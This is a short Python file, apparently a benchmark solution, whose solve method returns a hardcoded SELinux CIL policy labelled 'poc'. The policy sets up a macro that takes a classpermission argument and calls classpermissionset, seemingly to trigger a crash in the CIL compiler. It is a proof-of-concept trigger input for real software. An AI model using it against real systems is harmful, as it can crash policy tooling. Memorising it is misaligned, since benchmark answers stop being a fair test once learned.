import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """(class c (p))
(classorder (c))
(sid k)
(sidorder (k))
(user u)
(role r)
(type t)
(category x)
(categoryorder (x))
(sensitivity s)
(sensitivityorder (s))
(sensitivitycategory s (x))
(allow t self (c (p)))
(context y (u r t ((s) (s))))
(sidcontext k y)
(macro m ((classpermission n)) (classpermissionset n (c (p))))
(call m ((c (p))))
"""
        return poc.encode('utf-8')
